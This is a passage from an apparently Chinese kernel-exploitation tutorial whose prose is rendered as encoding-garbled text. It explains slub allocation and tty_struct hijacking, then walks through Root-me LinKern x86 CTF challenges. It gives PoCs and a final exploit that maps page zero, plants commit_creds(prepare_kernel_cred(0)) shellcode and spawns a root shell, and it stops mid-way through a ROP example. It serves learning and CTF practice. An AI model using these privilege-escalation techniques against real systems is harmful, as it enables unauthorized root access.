    {
        if (__builtin_constant_p(size)) {
            if (size > KMALLOC_MAX_CACHE_SIZE)
                return kmalloc_large(size, flags);
    #ifndef CONFIG_SLOB
            if (!(flags & GFP_DMA)) {
                int index = kmalloc_index(size);
                if (!index)
                    return ZERO_SIZE_PTR;
                return kmem_cache_alloc_trace(kmalloc_caches[index],
                        flags, size);
            }
    #endif
        }
        return __kmalloc(size, flags);
    }
æˆ‘ä»¬ç°åœ¨åªéœ€è¦æ˜ç¡®ï¼Œ`kmalloc`å…¶å®æ˜¯ä½¿ç”¨`slab/slub`åˆ†é…å™¨ï¼Œç°åœ¨å¤šè§çš„æ˜¯`slub`åˆ†é…å™¨ã€‚è¿™ä¸ªåˆ†é…å™¨é€šè¿‡ä¸€ä¸ªå¤šçº§çš„ç»“æ„è¿›è¡Œç®¡ç†ã€‚é¦–å…ˆæœ‰`cache`å±‚ï¼Œ`cache`æ˜¯ä¸€ä¸ªç»“æ„ï¼Œé‡Œè¾¹é€šè¿‡ä¿å­˜ç©ºå¯¹è±¡ï¼Œéƒ¨åˆ†ä½¿ç”¨çš„å¯¹è±¡å’Œå®Œå…¨ä½¿ç”¨ä¸­çš„å¯¹è±¡æ¥ç®¡ç†ï¼Œå¯¹è±¡å°±æ˜¯æŒ‡å†…å­˜å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯ç”¨æ¥åˆ†é…æˆ–è€…å·²ç»åˆ†é…çš„ä¸€éƒ¨åˆ†å†…æ ¸ç©ºé—´ã€‚
**`slab`åˆ†é…å™¨ä¸¥æ ¼æŒ‰ç…§`cache`å»åŒºåˆ†ï¼Œä¸åŒ`cache`çš„æ— æ³•åˆ†é…åœ¨ä¸€é¡µå†…ï¼Œ`slub`åˆ†é…å™¨åˆ™è¾ƒä¸ºå®½æ¾ï¼Œä¸åŒ`cache`å¦‚æœåˆ†é…ç›¸åŒå¤§å°ï¼Œå¯èƒ½ä¼šåœ¨ä¸€é¡µå†…ã€‚**
é‚£ä¹ˆæˆ‘ä»¬è‹¥èƒ½é€šè¿‡UAFæ¼æ´åŠ«æŒä¸€ä¸ª`tty_struct`æˆ‘ä»¬å°±èƒ½åŠ«æŒå…¶å†…éƒ¨çš„æ‰€æœ‰å‡½æ•°æŒ‡é’ˆï¼Œè¿›è€Œæ§åˆ¶ç¨‹åºæµç¨‹ã€‚
å…³äº`tty_struct`çš„å®šä¹‰ä½äº`/source/include/linux/tty.h#L282`ï¼š
    struct tty_struct {
        int    magic;
        struct kref kref;
        struct device *dev;
        struct tty_driver *driver;
        const struct tty_operations *ops;
        int index;
        /* Protects ldisc changes: Lock tty not pty */
        struct ld_semaphore ldisc_sem;
        struct tty_ldisc *ldisc;
        struct mutex atomic_write_lock;
        struct mutex legacy_mutex;
        struct mutex throttle_mutex;
        struct rw_semaphore termios_rwsem;
        struct mutex winsize_mutex;
        spinlock_t ctrl_lock;
        spinlock_t flow_lock;
        /* Termios values are protected by the termios rwsem */
        struct ktermios termios, termios_locked;
        struct termiox *termiox;    /* May be NULL for unsupported */
        char name[64];
        struct pid *pgrp;        /* Protected by ctrl lock */
        struct pid *session;
        unsigned long flags;
        int count;
        struct winsize winsize;        /* winsize_mutex */
        unsigned long stopped:1,    /* flow_lock */
                  flow_stopped:1,
                  unused:BITS_PER_LONG - 2;
        int hw_stopped;
        unsigned long ctrl_status:8,    /* ctrl_lock */
                  packet:1,
                  unused_ctrl:BITS_PER_LONG - 9;
        unsigned int receive_room;    /* Bytes free for queue */
        int flow_change;
        struct tty_struct *link;
        struct fasync_struct *fasync;
        wait_queue_head_t write_wait;
        wait_queue_head_t read_wait;
        struct work_struct hangup_work;
        void *disc_data;
        void *driver_data;
        spinlock_t files_lock;        /* protects tty_files list */
        struct list_head tty_files;
    #define N_TTY_BUF_SIZE 4096
        int closing;
        unsigned char *write_buf;
        int write_cnt;
        /* If the tty has a pending do_SAK, queue it here - akpm */
        struct work_struct SAK_work;
        struct tty_port *port;
    } __randomize_layout;
æˆ‘ä»¬æ¥ä¸‹æ¥é‡ç‚¹å…³æ³¨`tty_struct -> ops`ï¼Œå®ƒçš„ç±»å‹æ˜¯`const struct
tty_operations`ï¼Œè¿™ä¸ªç»“æ„ä½“çš„å®šä¹‰ä½äº`/source/include/linux/tty_driver.h#L253`ï¼š
    struct tty_operations {
        struct tty_struct * (*lookup)(struct tty_driver *driver,
                struct file *filp, int idx);
        int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
        void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
        int  (*open)(struct tty_struct * tty, struct file * filp);
        void (*close)(struct tty_struct * tty, struct file * filp);
        void (*shutdown)(struct tty_struct *tty);
        void (*cleanup)(struct tty_struct *tty);
        int  (*write)(struct tty_struct * tty,
                  const unsigned char *buf, int count);
        int  (*put_char)(struct tty_struct *tty, unsigned char ch);
        void (*flush_chars)(struct tty_struct *tty);
        int  (*write_room)(struct tty_struct *tty);
        int  (*chars_in_buffer)(struct tty_struct *tty);
        int  (*ioctl)(struct tty_struct *tty,
                unsigned int cmd, unsigned long arg);
        long (*compat_ioctl)(struct tty_struct *tty,
                     unsigned int cmd, unsigned long arg);
        void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
        void (*throttle)(struct tty_struct * tty);
        void (*unthrottle)(struct tty_struct * tty);
        void (*stop)(struct tty_struct *tty);
        void (*start)(struct tty_struct *tty);
        void (*hangup)(struct tty_struct *tty);
        int (*break_ctl)(struct tty_struct *tty, int state);
        void (*flush_buffer)(struct tty_struct *tty);
        void (*set_ldisc)(struct tty_struct *tty);
        void (*wait_until_sent)(struct tty_struct *tty, int timeout);
        void (*send_xchar)(struct tty_struct *tty, char ch);
        int (*tiocmget)(struct tty_struct *tty);
        int (*tiocmset)(struct tty_struct *tty,
                unsigned int set, unsigned int clear);
        int (*resize)(struct tty_struct *tty, struct winsize *ws);
        int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
        int (*get_icount)(struct tty_struct *tty,
                    struct serial_icounter_struct *icount);
        void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
    #ifdef CONFIG_CONSOLE_POLL
        int (*poll_init)(struct tty_driver *driver, int line, char *options);
        int (*poll_get_char)(struct tty_driver *driver, int line);
        void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
    #endif
        const struct file_operations *proc_fops;
    } __randomize_layout;
é€šå¸¸ï¼Œæˆ‘ä»¬å¸Œæœ›åŠ«æŒ`ioctl`è¿™ä¸ªå‡½æ•°æŒ‡é’ˆã€‚
## 0x05 ä»¥[Root-me]LinKern x86 â€“ Null pointer dereferenceä¸ºä¾‹
ğŸ…ï¼šæœ¬é¢˜è€ƒæŸ¥ç‚¹ â€“ Null pointer dereference in Kernel
æœ¬æ¼æ´çš„ç›¸å…³è¯´æ˜å·²åœ¨Kernel Pwn å­¦ä¹ ä¹‹è·¯(ä¸€)ä¸­è¯´æ˜ï¼Œæ­¤å¤„ä¸å†èµ˜è¿°ã€‚
###  Init æ–‡ä»¶åˆ†æ
å†…æ ¸ä»æœªå¼€å¯ä»»ä½•ä¿æŠ¤ã€‚
###  LKMs æ–‡ä»¶åˆ†æ
ä»…å¼€å¯äº†NXä¿æŠ¤ã€‚
####  é¢˜ç›®é€»è¾‘åˆ†æ
#####  tostring_write
å‡½æ•°é¦–å…ˆæ‰“å°`"Tostring: write()n"`ï¼Œç„¶åè°ƒç”¨`kmalloc`åˆ†é…ä¸€ä¸ªChunkã€‚
>
> `kmalloc`å‡½æ•°ç”¨äºåœ¨å†…æ ¸ä¸­åˆ†é…`Chunk`ï¼Œå®ƒæœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯`Size`ï¼Œç¬¬äºŒä¸ªå‚æ•°ç§°ä¸º`flag`ï¼Œé€šè¿‡å…¶ä»¥å‡ ä¸ªæ–¹å¼æ§åˆ¶`kmalloc`çš„è¡Œä¸ºã€‚
>
> ç”±äº`kmalloc`å‡½æ•°å¯ä»¥æœ€ç»ˆé€šè¿‡è°ƒç”¨ `__get_free_pages` æ¥è¿›è¡Œï¼Œå› æ­¤ï¼Œè¿™äº›`flag`é€šå¸¸å¸¦æœ‰ `GFP_` å‰ç¼€ã€‚
>
> æœ€é€šå¸¸ä½¿ç”¨çš„æ ‡å¿—æ˜¯`GFP_KERNEL`, è¿™æ„å‘³ç€æ­¤æ¬¡åˆ†é…æ˜¯ç”±è¿è¡Œåœ¨å†…æ ¸ç©ºé—´çš„è¿›ç¨‹è¿›è¡Œçš„ã€‚æ¢è¨€ä¹‹,
> è¿™æ„å‘³ç€è°ƒç”¨å‡½æ•°çš„æ˜¯ä¸€ä¸ªè¿›ç¨‹åœ¨å°è¯•æ‰§è¡Œä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ã€‚
>
> ä½¿ç”¨ `GFP_KENRL` å°†æ„å‘³ç€`kmalloc`èƒ½å¤Ÿä½¿å½“å‰è¿›ç¨‹åœ¨å†…å­˜ä¸è¶³çš„æƒ…å†µä¸‹æ‰§è¡Œç¡çœ æ“ä½œæ¥ç­‰å¾…ä¸€é¡µ. ä¸€ä¸ªä½¿ç”¨`GFP_KERNEL`
> æ¥åˆ†é…å†…å­˜çš„å‡½æ•°å¿…é¡»æ˜¯å¯é‡å…¥çš„å¹¶ä¸”ä¸èƒ½åœ¨åŸå­ä¸Šä¸‹æ–‡ä¸­è¿è¡Œ. è‹¥å½“å‰è¿›ç¨‹ç¡çœ , å†…æ ¸å°†é‡‡å–æ­£ç¡®çš„åŠ¨ä½œæ¥å®šä½ä¸€äº›ç©ºé—²å†…å­˜,
> æˆ–è€…é€šè¿‡åˆ·æ–°ç¼“å­˜åˆ°ç£ç›˜æˆ–è€…äº¤æ¢å‡ºå»ä¸€ä¸ªç”¨æˆ·è¿›ç¨‹çš„å†…å­˜ã€‚
>
> `GFP_KERNEL`ä¸ä¸€å®šæ˜¯æ­£ç¡®åˆ†é…æ ‡å¿—; æœ‰æ—¶`kmalloc`ä»ä¸€ä¸ªè¿›ç¨‹çš„ä¸Šä¸‹æ–‡çš„å¤–éƒ¨è¿›è¡Œè°ƒç”¨ã€‚è¿™ç±»çš„è°ƒç”¨å¯èƒ½å‘ç”Ÿåœ¨ä¸­æ–­å¤„ç†, tasklet,
> å’Œå†…æ ¸å®šæ—¶å™¨ä¸­. åœ¨è¿™ä¸ªæƒ…å†µä¸‹, å½“å‰è¿›ç¨‹ä¸åº”å½“è¢«ç½®ä¸ºç¡çœ , å¹¶ä¸”é©±åŠ¨åº”å½“ä½¿ç”¨ä¸€ä¸ª
> `GFP_ATOMIC`æ ‡å¿—æ¥ä»£æ›¿`GFP_KERNEL`ã€‚æ­¤æ—¶ï¼Œå†…æ ¸å°†æ­£å¸¸åœ°è¯•å›¾ä¿æŒä¸€äº›ç©ºé—²é¡µä»¥ä¾¿æ¥æ»¡è¶³åŸå­åˆ†é…ã€‚
>
> å½“ä½¿ç”¨`GFP_ATOMIC`æ—¶ï¼Œ`kmalloc`ç”šè‡³èƒ½å¤Ÿä½¿ç”¨æœ€åä¸€ä¸ªç©ºé—²é¡µã€‚å¦‚æœæœ€åä¸€ä¸ªç©ºé—²é¡µä¹Ÿä¸å­˜åœ¨å°†ä¼šå¯¼è‡´åˆ†é…å¤±è´¥ã€‚
>
> é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰å¦‚ä¸‹çš„æ ‡å¿—å¯ä¾›æˆ‘ä»¬é€‰æ‹©(æ›´å®Œæ•´çš„æ ‡å¿—åˆ—è¡¨è¯·æŸ¥é˜…`linux/gfp.h`)ï¼š
>
> `GFP_USER` â€“ ç”±ç”¨æˆ·æ€çš„ç¨‹åºæ¥åˆ†é…å†…å­˜ï¼Œå¯ä»¥ä½¿ç”¨ç¡çœ ç­‰å¾…æœºåˆ¶ã€‚
>
> `GFP_HIGHUSER` â€“ ä»é«˜åœ°å€åˆ†é…å†…å­˜ã€‚
>
> `GFP_NOIO` â€“ åˆ†é…å†…å­˜æ—¶ç¦æ­¢ä½¿ç”¨ä»»ä½•I/Oæ“ä½œã€‚
>
> `GFP_NOFS` â€“ åˆ†é…å†…å­˜æ—¶ç¦æ­¢è°ƒç”¨fså¯„å­˜å™¨ã€‚
>
> `GFP_NOWAIT` â€“ ç«‹å³åˆ†é…ï¼Œä¸åšç­‰å¾…ã€‚
>
> `__GFP_THISNODE` â€“ ä»…ä»æœ¬åœ°èŠ‚ç‚¹åˆ†é…å†…å­˜ã€‚
>
> `GFP_DMA` â€“ è¿›è¡Œé€‚ç”¨äº`DMA`çš„åˆ†é…ï¼Œè¿™åº”è¯¥ä»…åº”ç”¨äº`kmalloc`ç¼“å­˜ï¼Œå¦åˆ™è¯·ä½¿ç”¨`SLAB_DMA`åˆ›å»ºçš„`slab`ã€‚
æ­¤å¤„ç¨‹åºä½¿ç”¨çš„æ˜¯`GFP_DMA`æ ‡å¿—ã€‚
åœ¨é‚£ä¹‹åï¼Œç¨‹åºå°†ç”¨æˆ·ä¼ å…¥çš„æ•°æ®å‘è¯¥`Chunk`å†™å…¥`length`ä¸ªå­—èŠ‚ï¼Œå¹¶å°†æœ«å°¾ç½®é›¶ã€‚
ç„¶åç¨‹åºéªŒè¯æˆ‘ä»¬ä¼ å…¥æ•°æ®çš„å‰åä¸ªå­—èŠ‚æ˜¯å¦ä¸º`*`ï¼Œè‹¥æ˜¯ï¼Œç¨‹åºä¼šä»ç¬¬åä¸€å­—èŠ‚å¼€å§‹é€å­—èŠ‚è¿›è¡Œæ‰«æï¼Œæ ¹æ®ä¸åŒçš„â€™å‘½ä»¤â€™æ‰§è¡Œä¸åŒçš„æ“ä½œã€‚
åœ¨é‚£ä¹‹åç¨‹åºä¼šä»ç¬¬åä¸€å­—èŠ‚å¼€å§‹é—´éš”ä¸€ä¸ª`x00`æˆ–`n`å­—èŠ‚è¿›è¡Œæ‰«æï¼Œæ ¹æ®ä¸åŒçš„â€™å‘½ä»¤â€™æ‰§è¡Œä¸åŒçš„æ“ä½œã€‚
    H ï¼š å°†tostring->tostring_readè¿™ä¸ªå‡½æ•°æŒ‡é’ˆç½®ä¸ºtostring_read_hexaã€‚
    D ï¼š å°†tostring->tostring_readè¿™ä¸ªå‡½æ•°æŒ‡é’ˆç½®ä¸ºtostring_read_decã€‚
    S ï¼š å°†tostringç»“æ„ä½“æ¸…é™¤ï¼Œæ‰€æœ‰çš„æˆå‘˜å˜é‡ç½®ä¸ºNULLæˆ–0ï¼Œé‡Šæ”¾tostring->tostring_stackæŒ‡å‘çš„chunkã€‚
    N ï¼š é¦–å…ˆè°ƒç”¨local_strtoul(bufk+i+11,NULL,10)ï¼Œè‹¥æ­¤æ—¶tostring->tostring_stackä¸ºNULLï¼Œåˆ™æ‰§è¡Œtostringç»“æ„ä½“çš„åˆå§‹åŒ–ï¼Œå°†local_strtoul(bufk+i+11,NULL,10)çš„è¿”å›å€¼ä¹˜1024ä½œä¸ºsizeè°ƒç”¨kmallocå‡½æ•°å°†è¿”å›åœ°å€ä½œä¸ºtostring->tostring_stackæ‰€æŒ‡å‘çš„å€¼ï¼ŒåŒæ—¶è®¾ç½®pointer_maxè¿™ä¸ªæˆå‘˜å˜é‡çš„å€¼ä¸ºsize/sizeof(long long int)ï¼Œè®¾ç½®tostring->tostring_readè¿™ä¸ªå‡½æ•°æŒ‡é’ˆä¸ºtostring_read_hexaã€‚
å¦åˆ™ï¼Œç¨‹åºå°†ä¼šåœ¨`tostring->tostring_stack`ä¸­æ’å…¥åç»­çš„å€¼ã€‚
#####  tostring_read
ç¨‹åºå°†ç›´æ¥è°ƒç”¨tostring->tostring_readè¿™ä¸ªå‡½æ•°æŒ‡é’ˆ
####  é¢˜ç›®æ¼æ´åˆ†æ
ç¨‹åºåœ¨è°ƒç”¨tostring->tostring_readè¿™ä¸ªå‡½æ•°æŒ‡é’ˆæ—¶æ²¡æœ‰åšæŒ‡é’ˆæœ‰æ•ˆæ€§éªŒè¯ï¼Œè¿™å°†å¯¼è‡´ç¨‹åºè¯•å›¾è°ƒç”¨ä¸€ä¸ªç©ºæŒ‡é’ˆï¼Œè€Œåœ¨æ­¤ç‰ˆæœ¬çš„Kernelä¸­ï¼Œç¨‹åºå·²ç»å…³é—­äº†`mmap_min_addr`çš„ä¿æŠ¤ï¼Œè¿™å°†å¯¼è‡´æˆ‘ä»¬å¯ä»¥`mmap`ä¸€ä¸ª0åœ°å€å¤„çš„å†…å­˜æ˜ å°„ï¼Œè‹¥æˆ‘ä»¬èƒ½åœ¨0åœ°å€å¤„å†™å…¥shellcodeï¼Œç¨‹åºå°†ä¼šåœ¨è°ƒç”¨ç©ºæŒ‡é’ˆæ—¶è°ƒç”¨æ­¤ä½ç½®çš„shellcodeï¼Œäºæ˜¯å¯ä»¥ç›´æ¥ææƒã€‚
æˆ‘ä»¬çš„ç›®æ ‡æ˜¯è°ƒç”¨`commit_creds(prepare_kernel_cred(0))`ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„shellcodeå°±å¯ä»¥æ˜¯ï¼š
    xor eax,eax;
    call commit_creds;
    call prepare_kernel_cred;
    ret;
å…¶ä¸­`commit_creds`å’Œ`prepare_kernel_cred`å‡½æ•°çš„åœ°å€å¯ä»¥åœ¨`/proc/kallsyms`ä¸­å®šä½åˆ°ã€‚
å¯ä»¥ä½¿ç”¨`Radare2`ç”Ÿæˆ`shellcode`:
    rasm2 "xor eax,eax ; call 0xC10711F0 ; call 0xC1070E80 ; ret;"
####  åŠ¨æ€è°ƒè¯•éªŒè¯
é¦–å…ˆ`QEMU`çš„å¯åŠ¨æŒ‡ä»¤ä¸ºï¼š
    qemu-system-i386 -s 
    -kernel bzImage 
    -append nokaslr 
    -initrd initramfs.img 
    -fsdev local,security_model=passthrough,id=fsdev-fs0,path=/home/error404/Desktop/CTF_question/Kernel/Null_pointer_dereference/Share 
    -device virtio-9p-pci,id=fs0,fsdev=fsdev-fs0,mount_tag=rootme
ç„¶ååœ¨`QEMU`ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ç¡®å®šç›¸å…³`Section`çš„åœ°å€ï¼š
    lsmod
    grep 0 /sys/module/[module_name]/sections/.text
    grep 0 /sys/module/[module_name]/sections/.data
    grep 0 /sys/module/[module_name]/sections/.bss
    # 0xC8824000
    # 0xC88247E0
    # 0xC8824A80
åœ¨IDAå’ŒGDBä¸­è¿›è¡Œè®¾ç½®ï¼š
âš ï¸ **ï¼šåœ¨IDAè®¾ç½®åä¼šå¯¼è‡´åç¼–è¯‘ç»“æœå‡ºé”™ï¼Œè¯·è°¨æ…è®¾ç½®ï¼**
    # code in gdb
    add-symbol-file tostring.ko 0xC8824000 -s .data 0xC88247E0 -s .bss 0xC8824A80
é¦–å…ˆéªŒè¯æˆ‘ä»¬åˆ†æçš„é€»è¾‘æ˜¯æ­£ç¡®çš„ã€‚
æˆ‘ä»¬æ„å»ºå¦‚ä¸‹PoCå‘é€ï¼š
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    int main(void){
        int fd = open("/dev/tostring",2);
        write(fd,"**********H",11);
        write(fd,"**********D",11);
        write(fd,"**********S",11);
        write(fd,"**********N",11);
        write(fd,"AAAABBBB",9);
        return 0;
    }
    //gcc -m32 -static -o Exploit Exploit.c
é¢„æœŸæƒ…å†µä¸‹ï¼Œç¨‹åºåº”å½“ä¾æ¬¡æ‰§è¡ŒHã€Dã€Sã€Nå››ä¸ªå‘½ä»¤ï¼Œå¹¶åœ¨æœ€åå†™å…¥â€AAAABBBBâ€ã€‚
å‘ç°é€»è¾‘æ­£ç¡®ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°è¯•åŠ«æŒEIPï¼Œå‘é€ä»¥ä¸‹PoCï¼š
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    char payload[] = "xe9xeaxbexadx0b"; // jmp 0xbadbeef
    int main(void){
        char Get_shell[20] ; 
        mmap(0, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        memcpy(0, payload, sizeof(payload));
        int fd = open("/dev/tostring",2);
        write(fd,"**********S",11);
        read(fd,Get_shell,sizeof(Get_shell));
        return 0;
    }
    //gcc -m32 -static -o Exploit Exploit.c
æˆåŠŸåŠ«æŒï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æ›¿æ¢æ‰Shellcodeå³å¯å®Œæˆææƒã€‚
###  Final Exploit
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    char payload[] = "x31xc0xe8xe9x11x07xc1xe8x74x0ex07xc1xc3";
    int main(void){
        char Get_shell[20] ; 
        mmap(0, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        memcpy(0, payload, sizeof(payload));
        int fd = open("/dev/tostring",2);
        write(fd,"**********S",11);
        read(fd,Get_shell,sizeof(Get_shell));
        system("/bin/sh");
        return 0;
    }
    //gcc -m32 -static -o Exploit Exploit.c
## 0x06 ä»¥[Root-me]LinKern x86 â€“ basic ROPä¸ºä¾‹
ğŸ…ï¼šæœ¬é¢˜è€ƒæŸ¥ç‚¹ â€“ ROP in Kernelã€Bypass SMEP
###  è°ƒè¯•ä¿¡æ¯
`QEMU`å¯åŠ¨æŒ‡ä»¤ï¼š
    qemu-system-i386 -s 
    -kernel bzImage 
    -append nokaslr 
    -initrd initramfs.img 
    -fsdev local,security_model=passthrough,id=fsdev-fs0,path=/home/error404/Desktop/CTF_question/Kernel/basic_ROP/Share 
    -device virtio-9p-pci,id=fs0,fsdev=fsdev-fs0,mount_tag=rootme 
    -cpu kvm64,+smep
å‡ ä¸ªé‡è¦çš„åœ°å€ï¼š
    .text : 0xC8824000
    .data : 0xC88241A0
    .bss  : 0xC8824440
    # code in gdb
    add-symbol-file tostring.ko 0xC8824000 -s .data 0xC88241A0 -s .bss 0xC8824440
###  Init æ–‡ä»¶åˆ†æ
è¿˜æ˜¯æ­£å¸¸åŠ è½½LKMsï¼Œä½†æ˜¯è¿™æ¬¡æ²¡æœ‰å…³é—­`mmap_min_addr`é˜²æŠ¤ã€‚
æ ¹æ®é¢˜ç›®è¯´æ˜ï¼Œæœ¬æ¬¡å†…æ ¸å¯åŠ¨äº†`SMEP`ä¿æŠ¤ï¼Œè¿™å°†å¯¼è‡´å½“ç¨‹åºè¿›å…¥`Ring 0`çš„å†…æ ¸æ€æ—¶ï¼Œä¸å¾—æ‰§è¡Œç”¨æˆ·ç©ºé—´çš„ä»£ç ã€‚
**â­•ï¸ï¼šæ£€æµ‹`smep`æ˜¯å¦å¼€å¯å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š**
###  LKMsæ–‡ä»¶åˆ†æ
å’Œå¾€å¸¸ä¸€æ ·ï¼Œç”¨æˆ·æ€ä»…å¼€å¯äº†NXä¿æŠ¤ã€‚
####  é¢˜ç›®é€»è¾‘åˆ†æ&æ¼æ´åˆ†æ
æœ¬æ¬¡é¢˜ç›®é€»è¾‘å¾ˆç®€å•ï¼Œå°±æ˜¯ä¸€ä¸ªç®€å•çš„è¯»å…¥æ“ä½œï¼Œå½“æˆ‘ä»¬å‘å†…æ ¸å‘é€æ•°æ®æ—¶æœ‰ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„æ ˆæº¢å‡ºä¼šå‘ç”Ÿã€‚
ç¨‹åºåœ¨å‘bufå†™å…¥å€¼æ—¶å¹¶æ²¡æœ‰åšæœ€å¤§sizeé™åˆ¶ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“çš„è§¦å‘æ ˆæº¢å‡ºã€‚
###  æ§åˆ¶EIP
æˆ‘ä»¬è‹¥å‘é€ä»¥ä¸‹PoCï¼Œç¨‹åºåº”è¯¥ä¼šæ–­åœ¨`0xdeadbeef`ï¼š
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 